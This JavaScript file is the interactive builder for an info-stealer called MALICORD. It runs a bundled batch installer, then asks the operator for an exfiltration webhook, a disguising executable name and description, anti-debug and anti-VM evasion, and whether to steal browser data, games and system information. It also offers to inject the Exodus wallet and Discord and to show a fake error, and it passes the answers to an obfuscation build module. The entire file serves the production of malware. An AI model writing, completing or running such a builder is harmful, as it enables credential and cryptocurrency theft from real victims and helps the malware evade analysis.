const chalkAnimation = require("chalk-animation");
const readline = require("readline");
const gradient = require("gradient-string");
const build = require("./obfu.js");
const { spawnSync } = require("child_process");
const path = require("path")

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function translateResponse(response) {
  response = response.toLowerCase().trim();
  if (response === "y" || response === "yes" || response === "oui") {
    return "yes";
  } else if (response === "n" || response === "no" || response === "non") {
    return "no";
  } else {
    return "no";
  }
}

let currentQuestion = 1;
let config = {};

function askQuestion(question, callback) {
  rl.question(
    gradient.atlas(`Question ${currentQuestion}: ${question}`),
    (answer) => {
      currentQuestion++;
      callback(answer);
    }
  );
}

async function completeConfiguration() {
  let g = `                                                   MALICORD       



                                              .o######0o.
                                            0###########0.      .
                                            o####" "######0.    (## m#o
                                            ####(    ######0  ._ ##.##"nn
                                            0####o   ###" ## (##o.######"
                                    o00o.    0#####o,##. ,#"  "#######(
                                  .0#####0.   0###########0     ########
                                .0#######0.   "0#########"  _.o###'"00"
                                .0###########o._ ""################       _  .
                                0####" "#########################0      .0#0n0
                                #####.   ""#####################"    _  0#####
                                0#####.     "###################._.o##o.#####"
                                "0#####..##mn ""#############################
                                  "0#######""_    ""##################"#####"
                                    ""####m###m      ""############"   ####
                                    .########"""         .########"     "##"
                                    ####"##"###o        (0######"        ""
                                    "##".###,##     .o#o ""####.
                                        "##"      .0############.
                                                .n##RADIUS#######⠀
  `;
  let gf = chalkAnimation.radar(g);
  gf.start();

  setTimeout(async () => {
    gf.stop();

    const buildBatPath = path.join(
      __dirname,
      "script",
      "install.bat"
    );
    const options = {
      cwd: path.join(__dirname, "script"),
      stdio: "inherit", 
    };

    spawnSync(buildBatPath, [], options);
    
    
    console.clear();
    console.log(gradient.fruit(g));
    askQuestion("Enter your webhook: ", (answer) => {
      config["webhook"] = answer;
      askQuestion("Enter your executable file name: ", (answer) => {
        config["name"] = answer;
        askQuestion("Enter your executable file license: ", (answer) => {
          config["license"] = answer;
          askQuestion("Enter your executable file description: ", (answer) => {
            config["description"] = answer + " by KSCH-58";
            config["appFileDescription"] = answer;
            askQuestion("Do you want to block debug and VM ? ", (answer) => {
              let y = translateResponse(answer);
              config["blockdebug"] = y;
              askQuestion("Do you want to steal games ? ", (answer) => {
                let y = translateResponse(answer);
                config["game"] = y;
                config["launchers"] = y;
                askQuestion(
                  "Do you want to inject exodus/discord ? ",
                  (answer) => {
                    let y = translateResponse(answer);
                    config["inject"] = y;
                    askQuestion(
                      "Do you want to steal system informations ? ",
                      (answer) => {
                        let y = translateResponse(answer);
                        config["sysinfo"] = y;
                        askQuestion(
                          "Do you want to steal browsers ? ",
                          (answer) => {
                            let y = translateResponse(answer);
                            config["browsers"] = y;
                            askQuestion(
                              "Do you want to open a fake error ? ",
                              async (answer) => {
                                let y = translateResponse(answer);
                                config["fakeerror"] = y;
                                rl.close();
                                console.clear();
                                await build.main(config);
                              }
                            );
                          }
                        );
                      }
                    );
                  }
                );
              });
            });
          });
        });
      });
    });
  }, 5000);
}

completeConfiguration();
